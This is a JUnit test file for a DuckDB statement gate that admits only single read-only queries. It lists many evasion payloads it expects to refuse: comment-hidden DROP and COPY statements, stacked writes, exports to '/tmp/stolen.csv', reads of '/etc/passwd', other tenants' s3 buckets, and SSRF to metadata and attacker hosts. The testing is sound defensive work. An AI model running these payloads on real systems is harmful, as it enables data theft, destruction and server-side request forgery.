package process.analytics;

import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.springframework.test.util.ReflectionTestUtils;
import process.model.enums.StorageProvider;
import process.model.pojo.StorageConnection;
import process.util.EncryptionUtil;

import java.sql.Connection;
import java.sql.SQLException;
import java.sql.Statement;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.catchThrowable;
import static org.assertj.core.api.Assertions.catchThrowableOfType;

/**
 * Everything that has ever been used to walk a write past a SQL filter, tried against this one.
 *
 * This runs a REAL, locked-down DuckDB session -- the same one DuckDbSessionFactory hands a query
 * -- for two reasons. The gate's whole method is to ask DuckDB what a statement IS, so a mocked
 * engine would be a test of a fixture's opinion about SQL. And the parser it asks reaches it
 * through json_serialize_sql, a function of an extension, in a session where the local filesystem
 * has been removed and the configuration is locked: that this works after the lock-down is a
 * dependency of the gate, not an assumption, so it is exercised rather than believed.
 *
 * The evasions below are the reason the gate is not a list of forbidden words. Every one of them
 * defeats such a list, and none of them is clever: a comment in front of the statement, a newline,
 * the shift key, a second statement after a semicolon. The two that matter most are the last
 * pair -- a semicolon inside a STRING, which a word list refuses although it does nothing, and a
 * CTE whose body is a DELETE, which a word list beginning "must start with SELECT" admits.
 *
 * Half of this file is positive controls, and they are not decoration. A gate that refused
 * everything would pass every refusal here while leaving the feature with no purpose, and the
 * refusals are the half a careless change makes stricter.
 *
 * @author Nabeel Ahmed
 */
class StatementGateTest {

    /** Long enough that nothing here is timed out, short enough that a hang fails the build. */
    private static final int TIMEOUT_SECONDS = 10;

    private Connection session;

    @BeforeEach
    void openALockedDownSession() throws SQLException {
        AnalyticsLimits limits = new AnalyticsLimits();
        ReflectionTestUtils.setField(limits, "memoryLimit", "256MB");
        ReflectionTestUtils.setField(limits, "threads", 1);
        ReflectionTestUtils.setField(limits, "timeoutSeconds", TIMEOUT_SECONDS);
        ReflectionTestUtils.setField(limits, "maxRows", 1000);
        ReflectionTestUtils.setField(limits, "previewPageSize", 100);
        ReflectionTestUtils.setField(limits, "maxConcurrentQueries", 2);

        StorageConnection connection = new StorageConnection();
        connection.setStorageConnectionId(1L);
        connection.setProvider(StorageProvider.MINIO);
        connection.setAlias("test-store");

        // The real factory, so this is the session a query actually gets: disabled_filesystems
        // set, then lock_configuration, in that order and both already applied.
        this.session = new DuckDbSessionFactory(limits, new EncryptionUtil()).open(connection);
    }

    @AfterEach
    void closeSession() throws SQLException {
        if (this.session != null) {
            this.session.close();
        }
    }

    // ---- the fixture ----------------------------------------------------------------------------

    private StatementGate.Admitted admit(String sql) throws Exception {
        return StatementGate.admit(this.session, sql, TIMEOUT_SECONDS);
    }

    /** The sentence a user would be shown, for a statement the gate refuses on its own account. */
    private String refusalFor(String sql) {
        AnalyticsException refused = catchThrowableOfType(() -> admit(sql), AnalyticsException.class);
        assertThat(refused).as("admit(%s) should have refused", sql).isNotNull();
        return refused.getMessage();
    }

    /** Asserts a statement was let through, for the controls that keep the refusals honest. */
    private void assertAdmitted(String sql) {
        Throwable refused = catchThrowable(() -> admit(sql));
        assertThat(refused).as("admit(%s) should have been allowed", sql).isNull();
    }

    /** Asserts only that a statement did not get through, whichever way it was turned away. */
    private void assertRefused(String sql) {
        Throwable refused = catchThrowable(() -> admit(sql));
        assertThat(refused).as("admit(%s) should have refused", sql).isNotNull();
        assertThat(refused)
            .as("a refusal is either a sentence for the user or DuckDB's own parser error")
            .isInstanceOfAny(AnalyticsException.class, SQLException.class);
    }

    // ---- positive controls: the queries this feature exists to run -------------------------------

    @Test
    void aPlainSelectIsAdmittedExactlyAsItWasWritten() throws Exception {
        StatementGate.Admitted admitted = admit("SELECT id, region FROM dataset WHERE id > 3");

        // Exactly as written. A gate that admits one statement and hands back another has proved
        // something about a string nobody is going to run.
        assertThat(admitted.getSql()).isEqualTo("SELECT id, region FROM dataset WHERE id > 3");
        assertThat(admitted.isBoundable()).isTrue();
    }

    @Test
    void theShapesAQueryEditorIsFullOfAreAdmitted() throws Exception {
        String[] reads = {
            "select 1",
            "SELECT * FROM dataset",
            "WITH recent AS (SELECT * FROM dataset WHERE id > 10) SELECT count(*) FROM recent",
            "SELECT id FROM dataset UNION ALL SELECT id FROM dataset2",
            "SELECT id, row_number() OVER (PARTITION BY region ORDER BY id) AS rn FROM dataset",
            "SELECT d.id, r.label FROM dataset d JOIN dataset2 r ON d.region = r.region",
            "SELECT region, sum(amount) AS total FROM dataset GROUP BY region ORDER BY 2 DESC",
            "SELECT 1 /* a comment inside the query, which is where comments belong */",
            "SELECT * FROM dataset -- and one on the end\n",
            "SELECT 1;",
            // DuckDB parses both of these into a select node, so the gate inherits them for free
            // rather than having to decide about them. Recorded here because "what else did this
            // admit" is a fair question to ask of a rule this short.
            "DESCRIBE SELECT * FROM dataset",
            "SUMMARIZE SELECT * FROM dataset",
            "FROM dataset SELECT id",
        };
        for (String read : reads) {
            StatementGate.Admitted admitted = admit(read);
            assertThat(admitted.getSql()).as("<%s> should be admitted", read).isEqualTo(read.trim());
            assertThat(admitted.isBoundable()).as("<%s> should be boundable", read).isTrue();
        }
    }

    @Test
    void explainIsAdmittedAndIsTheOneReadThatIsNotBounded() throws Exception {
        StatementGate.Admitted admitted = admit("  explain\n  SELECT * FROM dataset  ");

        // Composed here from a fixed prefix and a remainder DuckDB confirmed is a single read,
        // rather than passed through, so nothing that preceded the keyword can survive into the
        // statement that runs.
        assertThat(admitted.getSql()).isEqualTo("EXPLAIN SELECT * FROM dataset");
        // Measured on 1.1.3: "SELECT * FROM (EXPLAIN ...) AS b" is a parser error, so an EXPLAIN
        // cannot be wrapped. It does not need to be -- a plan is one row whatever the file holds.
        assertThat(admitted.isBoundable()).isFalse();
    }

    // ---- the evasions ---------------------------------------------------------------------------

    @Test
    void aLeadingLineCommentDoesNotHideAWrite() {
        // The oldest one there is. "the statement starts with SELECT" is false of this, and every
        // filter that trims whitespace and looks at the first word admits it.
        assertThat(refusalFor("-- a harmless read\nDROP TABLE customers"))
            .isEqualTo("Analytics Studio only runs queries that read. This statement asks for "
                + "something else, so it was not run.");
    }

    @Test
    void aLeadingBlockCommentDoesNotHideAWrite() {
        assertRefused("/* just looking */ COPY (SELECT 1) TO '/tmp/stolen.csv'");
        // Nested and multi-line forms of the same trick, since a hand-written comment stripper is
        // where this kind of filter usually breaks.
        assertRefused("/* one\n   two\n   three */\nATTACH 'evil.db' AS evil");
        assertRefused("/*x*/--y\nINSTALL spatial");
    }

    @Test
    void leadingWhitespaceAndNewlinesDoNotHideAWrite() {
        assertRefused("\n\n\t   \r\n ATTACH 'evil.db' AS evil");
        assertRefused("   \t COPY (SELECT 1) TO '/tmp/stolen.csv'");
    }

    @Test
    void theShiftKeyIsNotAnEvasion() {
        for (String mixed : new String[] {
            "dRoP tAbLe customers",
            "CoPy (SELECT 1) tO '/tmp/stolen.csv'",
            "InStAlL spatial",
            "LoAd json",
            "aTtAcH 'evil.db' AS evil",
            "PrAgMa database_list",
            "SeT memory_limit='64GB'" }) {

            assertRefused(mixed);
        }
    }

    @Test
    void aWriteAfterASemicolonIsRefusedAndTheReasonMattersMoreThanTheRefusal() {
        // Measured on duckdb_jdbc 1.1.3, and the reason this rule exists at all:
        // executeQuery("SELECT 1; INSERT INTO t VALUES (77)") throws "executeQuery() can only be
        // used with queries that return a ResultSet" -- AFTER the insert has happened. The
        // exception is a complaint about the return value, not a refusal, so a caller who trusted
        // the throw would have been robbed and thanked for it.
        assertRefused("SELECT 1; DROP TABLE customers");
        assertRefused("SELECT 1; INSTALL spatial");
        assertRefused("SELECT * FROM dataset;\n-- innocent\nCOPY (SELECT 1) TO '/tmp/stolen.csv'");
    }

    @Test
    void twoReadsAreStillTwoStatementsAndAreStillRefused() {
        // Both halves are reads, so nothing here is dangerous; it is refused because the rule is
        // "one statement", and a rule that only counts when it dislikes the second statement is
        // not a rule about statements.
        assertThat(refusalFor("SELECT 1; SELECT 2"))
            .isEqualTo("Analytics Studio runs one statement at a time. "
                + "Remove the semicolon and everything after it.");
    }

    @Test
    void aSemicolonInsideAStringLiteralIsJustText() throws Exception {
        // The other direction, and the one a word list gets wrong every time: this statement
        // contains "DROP TABLE" and a semicolon, does nothing whatever, and is exactly what a
        // person writing a report label types. Refusing it would be a bug that looks like caution.
        assertThat(admit("SELECT ';DROP TABLE customers' AS note").isBoundable()).isTrue();
        assertThat(admit("SELECT * FROM dataset WHERE region = 'COPY x TO /tmp/y'").isBoundable())
            .isTrue();
        assertThat(admit("SELECT 1 /* ; DROP TABLE customers */").isBoundable()).isTrue();
    }

    @Test
    void aCteWhoseBodyIsAWriteIsRefused() {
        // "It begins with WITH, and WITH means SELECT" is the assumption this breaks. DuckDB
        // answers "A CTE needs a SELECT" rather than serialising it, which is the gate borrowing
        // a judgement it would have had to make itself and would have made worse.
        assertRefused("WITH gone AS (DELETE FROM customers RETURNING *) SELECT * FROM gone");
        assertRefused("WITH added AS (INSERT INTO t VALUES (1) RETURNING *) SELECT * FROM added");
        assertRefused("WITH x AS (SELECT 1) SELECT * FROM x; DROP TABLE customers");
    }

    @Test
    void everyStatementThatIsNotAReadIsRefusedByName() {
        for (String write : new String[] {
            "COPY (SELECT * FROM dataset) TO '/tmp/stolen.csv' (FORMAT CSV)",
            "COPY (SELECT * FROM dataset) TO 's3://someone-elses-bucket/out.csv'",
            "ATTACH 'evil.db' AS evil",
            "ATTACH ':memory:' AS scratch",
            "INSTALL spatial",
            "LOAD json",
            "PRAGMA database_list",
            "PRAGMA version",
            "SET memory_limit='64GB'",
            "SET disabled_filesystems=''",
            "EXPORT DATABASE '/tmp/everything'",
            "CREATE TABLE t (a INT)",
            "CREATE VIEW dataset AS SELECT 1",
            "INSERT INTO t VALUES (1)",
            "UPDATE t SET a = 1",
            "DELETE FROM t",
            "DROP TABLE customers",
            "CALL pragma_version()",
            "PREPARE p AS SELECT 1",
            "BEGIN TRANSACTION",
            "CHECKPOINT" }) {

            assertThat(refusalFor(write)).as("<%s>", write)
                .isEqualTo("Analytics Studio only runs queries that read. This statement asks for "
                    + "something else, so it was not run.");
        }
    }

    @Test
    void loadOfAnExtensionAlreadyCompiledInIsRefusedHereRatherThanLeftToTheFilesystem() {
        // The case the synthesis calls out by name. DuckDbLockdownTest proves an extension that
        // has to be read from disk cannot be installed, because there is no disk -- but json ships
        // inside duckdb_jdbc and LOADs happily, so the filesystem rule says nothing about it. This
        // is the layer that does.
        assertRefused("LOAD json");
        assertRefused("load json");
    }

    @Test
    void aStatementThatIsOnlyACommentIsNothingToRun() {
        for (String nothing : new String[] {
            "-- I will write this tomorrow",
            "/* nothing here yet */",
            "-- one\n-- two\n-- three",
            "",
            "   \n\t  ",
            null }) {

            assertThat(refusalFor(nothing)).as("<%s>", nothing).isEqualTo("There is no query to run.");
        }
    }

    @Test
    void theRowLimitWrapperCannotBeClosedEarly() {
        // The specific attack on bounded(): the wrapper is "SELECT * FROM (" + text + ") AS
        // bounded_query LIMIT n", so a text that closes the bracket itself and comments out the
        // tail would turn one statement into two. It never parses on its own, and the gate sees
        // the text before the wrapper does.
        // Typed as Throwable only because SQLException is itself Iterable<Throwable>, which
        // makes assertThat ambiguous over it.
        Throwable refused = catchThrowableOfType(
            () -> admit("SELECT 1) AS q; DROP TABLE customers --"), SQLException.class);

        assertThat(refused).isNotNull();
        // DuckDB's own words, which is the right answer once the user holds the SQL -- and the
        // reason this comes back as the exception the engine would have raised: explain() already
        // decides how an engine message reaches a person, and there is one of those decisions.
        assertThat(refused.getMessage()).contains("Parser Error");
        assertThat(refused.getMessage()).contains("syntax error at or near");
    }

    @Test
    void aMalformedStatementComesBackInDuckDbsOwnWords() {
        Throwable refused = catchThrowableOfType(() -> admit("SELCT 1"), SQLException.class);

        assertThat(refused).isNotNull();
        assertThat(refused.getMessage()).contains("SELCT");
    }

    @Test
    void anUnterminatedCommentIsAMalformedStatementRatherThanAnEmptyOne() {
        // Worth its own case because it is where a hand-written comment stripper produces an empty
        // string and then admits it, or strips to a fragment and admits that.
        assertRefused("SELECT 1 /* and then I stopped typing");
    }

    @Test
    void explainAnalyzeIsRefusedInWordsThatSayWhy() {
        // Not a syntax error and not a write: it is a real DuckDB statement that RUNS the query
        // and returns a profile instead of rows. Kept out because the admitted set is deliberately
        // the smallest one that covers the screen, and told apart from the rest because a user who
        // typed valid SQL deserves better than being told it does not parse.
        assertThat(refusalFor("EXPLAIN ANALYZE SELECT * FROM dataset"))
            .isEqualTo("EXPLAIN ANALYZE runs the query as well as planning it. Run the query "
                + "itself, or EXPLAIN it without ANALYZE.");
        assertThat(refusalFor("explain   analyze select 1")).contains("without ANALYZE");
    }

    @Test
    void anExplainOfSomethingThatIsNotAReadIsStillRefused() {
        // The EXPLAIN branch is the one place the gate looks at text itself, so the thing to check
        // is that what it hands back through is put through the same admission as anything else.
        assertRefused("EXPLAIN COPY (SELECT 1) TO '/tmp/stolen.csv'");
        assertRefused("EXPLAIN DROP TABLE customers");
        assertRefused("EXPLAIN SELECT 1; DROP TABLE customers");
        assertRefused("EXPLAIN SELECT 1; SELECT 2");
        // A comment before the keyword is refused rather than skipped. Whatever the pattern
        // skipped would be dropped from the statement that runs, and dropping whitespace is the
        // only version of that which is honest.
        assertRefused("-- plan this\nEXPLAIN SELECT 1");
    }

    // ---- a read of the wrong thing is still the wrong thing ---------------------------------------

    @Test
    void aQueryCannotHideALocationInTheSchemaOrCatalogHalfOfAName() {
        // The evasion that got past the first version of this gate, and the reason the check now
        // covers all three parts of a qualified name. DuckDB writes a base table as
        // catalog.schema.table and the replacement scan folds them back into one location, so a
        // QUOTED SCHEMA carries the URL while the table half stays innocent and passes JUST_A_NAME:
        //
        //     FROM "s3://victim/"."payroll.csv"  ->  schema_name "s3://victim/", table_name "payroll.csv"
        //
        // Verified against 1.1.3 before this was fixed: the s3 form issued a real SIGNED GET on a
        // bucket the caller never had, spending the session's own credential, and the http form
        // made a live outbound request to an arbitrary host and port -- server-side request forgery
        // from inside the backend. Both are reads, so nothing about "is this a SELECT" catches them.
        for (String hidden : new String[] {
            "SELECT * FROM \"s3://someone-elses-bucket/\".\"payroll.csv\"",
            "SELECT * FROM \"http://127.0.0.1:8931/\".\"exfil.csv\"",
            "SELECT * FROM \"http://169.254.169.254/\".\"latest.json\"",
            // The three-part form, where the location sits in the catalog instead.
            "SELECT * FROM \"http://attacker.test/a\".\"b\".\"c.csv\"",
            // And buried, because a walk that only looked at the top of the tree would miss these.
            "WITH x AS (SELECT * FROM \"s3://victim/\".\"k.csv\") SELECT * FROM x",
            "SELECT * FROM dataset UNION ALL SELECT * FROM \"s3://victim/\".\"k.csv\"",
            "SELECT (SELECT count(*) FROM \"s3://victim/\".\"k.csv\") AS n",
        }) {
            assertRefused(hidden);
        }
    }

    @Test
    void anOrdinaryQualifiedNameIsStillAllowed() {
        // The control. Refusing every schema-qualified name would pass the test above while
        // breaking normal SQL -- main.dataset is how a person disambiguates, and a temp view of
        // ours is reachable that way too.
        assertAdmitted("SELECT * FROM main.dataset");
        assertAdmitted("SELECT * FROM memory.main.dataset");
        assertAdmitted("SELECT a.x FROM main.dataset AS a JOIN main.dataset2 AS b ON a.id = b.id");
    }

    @Test
    void aQueryCannotNameALocationOfItsOwn() {
        // The hole that is invisible if the only question asked is "is this a read". Every one of
        // these IS a read. The session holds one storage connection's credentials and DuckDB will
        // spend them on any s3:// URL a statement names, so this is "use these credentials against
        // a different bucket" -- the request synthesis 3.3 says the API cannot express, being
        // expressed in the one field phase three added.
        for (String elsewhere : new String[] {
            "SELECT * FROM read_csv_auto('s3://someone-elses-bucket/secrets.csv')",
            "SELECT * FROM read_parquet('s3://etl-bucket/other-tenant/payroll.parquet')",
            "SELECT * FROM parquet_scan('s3://etl-bucket/kafka/keystore.parquet')",
            "SELECT * FROM read_json_auto('https://attacker.example/x.json')",
            "SELECT * FROM read_csv_auto('/etc/passwd')",
            "SELECT * FROM read_text('/etc/passwd')",
            "SELECT * FROM glob('/**')",
            // Built at runtime, so no rule that looks at string constants would see it.
            "SELECT * FROM read_csv_auto(concat('s3://', 'other-bucket/x.csv'))",
            // Buried where a FROM clause is not expected to be.
            "SELECT (SELECT count(*) FROM read_csv_auto('s3://other/x.csv')) AS n",
            "SELECT * FROM dataset WHERE id IN (SELECT id FROM read_csv_auto('s3://other/x.csv'))",
            "WITH stolen AS (SELECT * FROM read_csv_auto('s3://other/x.csv')) SELECT * FROM stolen",
            "SELECT * FROM dataset UNION ALL SELECT * FROM read_csv_auto('s3://other/x.csv')",
            "EXPLAIN SELECT * FROM read_csv_auto('s3://other/x.csv')" }) {

            assertThat(refusalFor(elsewhere)).as("<%s>", elsewhere)
                .contains("reads the datasets it was given, by name");
        }
    }

    @Test
    void aBareStringInAFromClauseIsALocationToo() {
        // Measured on 1.1.3: "FROM 's3://bucket/key.csv'" parses as a BASE TABLE whose NAME is the
        // URL, and DuckDB's replacement scan opens it at bind time. A rule that only looked at
        // function calls would have admitted every one of these.
        for (String bare : new String[] {
            "SELECT * FROM 's3://someone-elses-bucket/secrets.csv'",
            "SELECT * FROM \"s3://someone-elses-bucket/secrets.csv\"",
            "FROM 's3://someone-elses-bucket/secrets.csv'",
            "SELECT * FROM '/etc/passwd'",
            "SELECT * FROM 'exports/*.parquet'" }) {

            assertThat(refusalFor(bare)).as("<%s>", bare)
                .isEqualTo("A query reads the datasets it was given, by name: dataset, and "
                    + "dataset2 when a second one was chosen. It cannot name a file, a bucket or "
                    + "a URL of its own.");
        }
    }

    @Test
    void aUrlThatIsJustAValueIsNotALocation() throws Exception {
        // The control that stops the rule above from being a ban on the characters. A dataset of
        // web logs has URLs in it, and filtering on one is an ordinary question -- it is a string
        // constant in a WHERE clause and it opens nothing.
        assertThat(admit("SELECT * FROM dataset WHERE url = 'https://example.com/page'")
            .isBoundable()).isTrue();
        assertThat(admit("SELECT 's3://etl-bucket/x.csv' AS example_path").isBoundable()).isTrue();
        assertThat(admit("SELECT count(*) FROM dataset WHERE path LIKE '/etc/%'").isBoundable())
            .isTrue();
    }

    @Test
    void theShapesThatBuildATableWithoutNamingALocationStillWork() throws Exception {
        // The other control. Refusing table functions as a class is only acceptable because
        // nothing a person needs here goes through one: the datasets are already names, and a
        // literal table, a subquery and a CTE all remain.
        assertThat(admit("SELECT * FROM (VALUES (1,'a'),(2,'b')) AS t(id, label)").isBoundable())
            .isTrue();
        assertThat(admit("SELECT * FROM (SELECT id FROM dataset) AS inner_query").isBoundable())
            .isTrue();
        assertThat(admit("WITH r AS (SELECT 1 AS a) SELECT * FROM r").isBoundable()).isTrue();
    }

    @Test
    void aTableFunctionIsRefusedEvenWhenItIsHarmless() {
        // Honest about what this costs. range() and duckdb_settings() open nothing, and they are
        // refused anyway, because the alternative is a list of the table functions that read files
        // -- which is a list of the ones somebody thought of, kept up to date by nobody. Adding a
        // named function back is one line and a reason; the default is no.
        assertThat(refusalFor("SELECT * FROM range(10)"))
            .isEqualTo("A query reads the datasets it was given, by name. Reading through a table "
                + "function is not allowed, because that is how a statement names a location "
                + "nobody checked.");
        assertRefused("SELECT * FROM generate_series(1, 10)");
        assertRefused("SELECT * FROM duckdb_settings()");
        assertRefused("SELECT * FROM duckdb_secrets()");
    }

    // ---- the differentials: where two layers might read the same text differently ------------------

    @Test
    void aNulByteIsRefusedRatherThanTrustedToTruncateTheSameWayTwice() {
        // The classic parser differential: text that the checker and the executor disagree about
        // the end of. Measured on 1.1.3, they agree -- the parse and the execution both stop at
        // the NUL, so "SELECT 1<NUL>; DROP TABLE customers" parses AND runs as "SELECT 1", and an
        // INSERT hidden behind one does not happen. That agreement is a property of a native
        // boundary nobody here controls, so it is not something to build a gate on.
        // Written as (char) 0 rather than as an escape, because a NUL in a source file is a
        // character nobody reviewing this can see.
        assertThat(refusalFor("SELECT 1" + (char) 0 + "; DROP TABLE customers"))
            .contains("character a query cannot contain");
        assertThat(refusalFor("SELECT 1;" + (char) 0 + "DROP TABLE customers"))
            .contains("character a query cannot contain");
    }

    @Test
    void commentTricksFromOtherEnginesAreDecidedByTheEngineThatWillRunTheStatement() throws Exception {
        // None of these is refused, and none of them needs to be, which is the point of asking
        // DuckDB rather than writing a comment stripper. It nests block comments, so the DROP in
        // the first is inside the comment; it does not honour MySQL's /*! version comment, so the
        // second is a comment too; and U+2028 is not a line ending to it, so the third stays
        // commented out. In every case the statement that runs is the statement that was judged,
        // because the same parser did both.
        assertThat(admit("/* /* nested */ DROP TABLE customers */ SELECT 1").isBoundable()).isTrue();
        assertThat(admit("SELECT 1 /*!DROP TABLE customers*/").isBoundable()).isTrue();
        // U+2028, which some editors and pasted JSON carry: a line separator to Unicode and an
        // ordinary character to DuckDB, so the semicolon after it stays inside the comment.
        assertThat(admit("SELECT 1 -- " + (char) 0x2028 + "; DROP TABLE customers")
            .isBoundable()).isTrue();
        // And the version a hand-written stripper gets wrong in the other direction: a real
        // newline does end the comment, so this is two statements and is refused.
        assertRefused("SELECT 1 --\n; DROP TABLE customers");
    }

    @Test
    void aQueryNestedBeyondAnythingAPersonWritesIsRefusedRatherThanWalked() {
        // The walk over the parsed statement is recursive and the statement comes from a request.
        // A StackOverflowError is an Error rather than an Exception, so it would go straight past
        // the endpoint's catch blocks and out as a 500 with a stack trace.
        StringBuilder nested = new StringBuilder("SELECT 1");
        for (int level = 0; level < 200; level++) {
            nested = new StringBuilder("SELECT * FROM (" + nested + ") AS x" + level);
        }
        assertThat(refusalFor(nested.toString())).contains("nested too deeply");
    }

    // ---- the second look, at the string that will actually run -----------------------------------

    @Test
    void theComposedStatementIsGatedTooRatherThanTakenOnTrust() throws Exception {
        // What admit() judged was the submission; what runs is the submission inside bounded()'s
        // wrapper. Confirming the composed string costs one parse and removes the argument that
        // wrapping cannot possibly have changed anything.
        StatementGate.confirmComposed(this.session,
            "SELECT * FROM (SELECT 1) AS bounded_query LIMIT 1000", TIMEOUT_SECONDS);
    }

    @Test
    void aCommentOnTheLastLineIsCaughtBeforeItSwallowsTheRowLimit() {
        // The honest query the wrapper breaks: "SELECT 1 -- note" becomes
        // "SELECT * FROM (SELECT 1 -- note) AS bounded_query LIMIT 1000", where the closing
        // bracket and the LIMIT are both inside the comment. Without this the user would be shown
        // a syntax error about a statement they did not write.
        AnalyticsException refused = catchThrowableOfType(
            () -> StatementGate.confirmComposed(this.session,
                "SELECT * FROM (SELECT 1 -- note) AS bounded_query LIMIT 1000", TIMEOUT_SECONDS),
            AnalyticsException.class);

        assertThat(refused).isNotNull();
        assertThat(refused.getMessage()).contains("comment on the last line");
    }

    @Test
    void aComposedStatementThatSomehowBecameTwoIsRefused() {
        // There is no known text that reaches this today -- admit() has already refused anything
        // that could close the wrapper early. It is asserted anyway, because "no known text" is a
        // statement about the wrapper as it is written this morning.
        AnalyticsException refused = catchThrowableOfType(
            () -> StatementGate.confirmComposed(this.session,
                "SELECT 1; DROP TABLE customers", TIMEOUT_SECONDS), AnalyticsException.class);

        assertThat(refused).isNotNull();
    }

    // ---- the session itself ----------------------------------------------------------------------

    @Test
    void theGateWorksOnTheSessionAQueryActuallyGets() throws Exception {
        // The dependency underneath every assertion above: the gate asks DuckDB to parse, through
        // a function of the json extension, in a session where the local filesystem is gone and
        // the configuration is locked. If autoloading that function ever needed the disk, every
        // query in the feature would fail closed -- correctly, and completely.
        try (Statement statement = this.session.createStatement()) {
            assertThat(statement.executeQuery("SELECT 1").next()).isTrue();
        }
        assertThat(admit("SELECT 1").getSql()).isEqualTo("SELECT 1");
    }
}
